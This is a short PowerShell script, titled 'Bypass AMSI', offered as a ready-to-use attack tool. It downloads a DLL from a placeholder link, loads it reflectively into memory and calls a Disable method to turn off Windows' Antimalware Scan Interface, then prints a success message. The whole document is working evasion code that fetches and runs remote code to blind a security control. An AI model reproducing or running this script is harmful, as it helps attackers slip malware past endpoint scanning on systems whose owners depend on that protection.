# Bypass AMSI

function BYPASS-AMSI
{

([AppDomain]::CurrentDomain.Load((New-Object net.webclient).DownloadData('LINK-TO-YOUR-DLL')))
[BYPASS.AMSI]::Disable() # Load class & EntryPoint
echo "[+] DLL has been reflected"

}
BYPASS-AMSI 